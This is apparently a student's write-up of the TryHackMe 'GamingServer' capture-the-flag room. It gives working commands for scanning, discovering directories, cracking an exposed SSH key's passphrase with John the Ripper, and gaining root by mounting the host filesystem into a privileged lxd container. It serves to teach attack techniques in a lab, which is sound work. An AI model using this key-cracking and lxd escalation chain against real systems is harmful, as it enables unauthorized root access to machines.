# GamingServer

[https://tryhackme.com/r/room/gamingserver](https://tryhackme.com/r/room/gamingserver)

### **USER_FLAG{ } :**

1. we get the target ip which is 10.10.73.9
2. after doing an port scan  → 

`nmap -sC -sV 10.10.73.9 >> nmap.txt`

![game_server-1](https://github.com/Ruhanyat-994/ctf-capture_the_flag-/assets/110297704/f5e8b5f1-4e74-43f7-808f-2caf462169e1)

1. there are only two ports open ssh and http
2. if we go to that IP we can find a website

![game_server-2](https://github.com/Ruhanyat-994/ctf-capture_the_flag-/assets/110297704/a221b63e-307e-4824-8e35-7ac2eed5ebe8)

1. and in the dev tools we can have a potential user name which is john
2. for finding hidden files and directories we can use 

`gobuster dir -u [http://10.10.73.9](http://10.10.73.9/) -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x .html,.php,.txt`

1. we found some directories

![game_server-3](https://github.com/Ruhanyat-994/ctf-capture_the_flag-/assets/110297704/68c04bd6-b984-4c22-979f-dccc79c99180)

1. `/about.html (Status: 200)
/about.php (Status: 200)
/index.html (Status: 200)
/robots.txt (Status: 200)
/uploads (Status: 301)
/myths.html (Status: 200)
/secret (Status: 301)`
2. In the `/secret` directory, we have a file named `secretKey` which contains a private key. We have SSH installed on the target machine. This could be the private SSH key of user `john`.
3. 

![game_server-4](https://github.com/Ruhanyat-994/ctf-capture_the_flag-/assets/110297704/1ec8cde6-b8f5-4454-b9eb-e1645fa4feef)

1. but this thing is password protected
2. We also have a `/uploads` which contains some interesting files.
    
    ![https://digitalpress.fra1.cdn.digitaloceanspaces.com/iozzwn2/2023/01/g-uploads.png](https://digitalpress.fra1.cdn.digitaloceanspaces.com/iozzwn2/2023/01/g-uploads.png)
    
    Of course we need to check the `meme.jpg` first :D
    
    ![https://digitalpress.fra1.cdn.digitaloceanspaces.com/iozzwn2/2023/01/g-meme.png](https://digitalpress.fra1.cdn.digitaloceanspaces.com/iozzwn2/2023/01/g-meme.png)
    
    We also have a "The Hacker Manifesto" which looks pretty neat!
    
    ![https://digitalpress.fra1.cdn.digitaloceanspaces.com/iozzwn2/2023/01/g-manifesto.png](https://digitalpress.fra1.cdn.digitaloceanspaces.com/iozzwn2/2023/01/g-manifesto.png)
    
    There is another file named `dict.lst` which looks like a wordlist. Let's download this to our system. We can use this wordlist to crack the private key!
    
3. User Shell
    
    We can use John the Ripper tool to crack the password for the private key of user `john`.
    
    We need to convert the `secretKey` into a format that John can understand.We will be using `ssh2john.py` for this.
    
    I'll save the output in `hash.txt` and then we can crack the password with the wordlist we found using John the Ripper.
    
    ![Untitled](GamingServer%204dee5f9a77194ea79397127f01abba90/Untitled%204.png)
    
    ![Untitled](GamingServer%204dee5f9a77194ea79397127f01abba90/Untitled%205.png)
    
    We got the password for the private key. Now we can login via SSH and read the user flag!
    
4. Now we ave to use  `ssh -i secretKey [john@10.10.215.18](mailto:john@10.10.215.18)`

![Untitled](GamingServer%204dee5f9a77194ea79397127f01abba90/Untitled%206.png)

in this form we need to give te secretKey 600 chmod permissio (600 permissions means that **only the owner of the file has full read and write access to it**.)

ssh private key needs 600  permission

### **ROOT_FLAG{ }:**

1. We have a shell as user `john` and now we need to find a way to escalate our privileges to root.

If we use the `id` command, we can see that the user `john` is a part of the `lxd` group.

![Untitled](GamingServer%204dee5f9a77194ea79397127f01abba90/Untitled%207.png)

LXD is a lightweight container hypervisor which allows to run linux containers. If a member is part of the `lxd` group, it can escalate its privileges to user `root` irrespective of the fact that it has sudo permissions or not.

I found [this](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation?ref=infosecarticles.com) guide related to `lxd` privilege escalation. We need to build an `alpine` image and then we can mount the `/root` directory of  the target machine to the `/mnt` directory of a `lxd` container.

1. First we need to build the image in our own machine:
    
    ```
    git clone https://github.com/saghul/lxd-alpine-builder.git
    cd lxd-alpine-builder
    ./build-alpine
    
    ```
    
    This will create a `.tar.gz` compressed image similar to this:
    
    ![Untitled](GamingServer%204dee5f9a77194ea79397127f01abba90/Untitled%208.png)
    
    Next we need to copy the compressed file to the target machine and then import the image using `lxc`.
    
    ```
    john@exploitable:~$ lxc image import ./alpine-* --alias myimage
    Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
    ```
    
    ```
    john@exploitable:~$ lxc image list
    +---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
    |  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
    +---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
    | myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Jan 7, 2023 at 6:10pm (UTC) |
    +---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
    john@exploitable:~$ lxc init myimage image -c security.privileged=true
    Creating image
    ```
    
    ```
    john@exploitable:~$ lxc config device add image mydevice disk source=/ path=/mnt/root recursive=true
    Device mydevice added to image
    ```
    
    ```
    john@exploitable:~$ lxc start image
    ```
    
    Our container has been created. Now we can simply start the container and read our final flag in the `/mnt/root/root` directory!
    
    ```
    john@exploitable:~$ lxc exec image /bin/sh
    ~ # id
    uid=0(root) gid=0(root)
    ~ # cd /mnt/root/root/
    /mnt/root/root # cat root.txt
    ********************************
    
    ```
    
2. In the middle section you have to run a simple http server and the you have to wget with your machines ip address tun0 in the target machine.s

![Untitled](GamingServer%204dee5f9a77194ea79397127f01abba90/Untitled%209.png)

at last !

![Untitled](GamingServer%204dee5f9a77194ea79397127f01abba90/Untitled%2010.png)

### **Alhumdulillah!**
